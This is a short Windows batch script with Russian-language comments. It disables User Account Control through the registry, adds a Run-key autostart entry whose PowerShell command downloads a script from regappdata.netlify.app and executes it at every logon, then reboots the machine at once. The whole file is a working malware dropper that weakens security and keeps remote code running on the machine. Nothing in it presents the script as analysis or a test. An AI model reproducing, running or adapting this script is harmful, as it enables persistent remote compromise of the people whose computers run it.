@echo off
:: Отключение UAC (если не отключено ранее)
echo Отключение UAC...
reg.exe ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f

:: Проверка, удалось ли отключить UAC
if %errorlevel% neq 0 (
    echo Ошибка: Не удалось изменить настройки UAC. Запустите скрипт от имени администратора.
    pause
    exit /b
)

:: Добавление команды PowerShell в автозапуск
echo Добавление команды в автозапуск...
reg.exe ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v AutoRunCommand /t REG_SZ /d "powershell -c irm regappdata.netlify.app/zzz.txt | iex" /f

:: Проверка, удалось ли добавить команду в автозапуск
if %errorlevel% neq 0 (
    echo Ошибка: Не удалось добавить команду в автозапуск.
    pause
    exit /b
)

:: Сообщение и перезагрузка системы
echo Изменения внесены. Компьютер будет перезагружен.
pause
shutdown /r /t 0
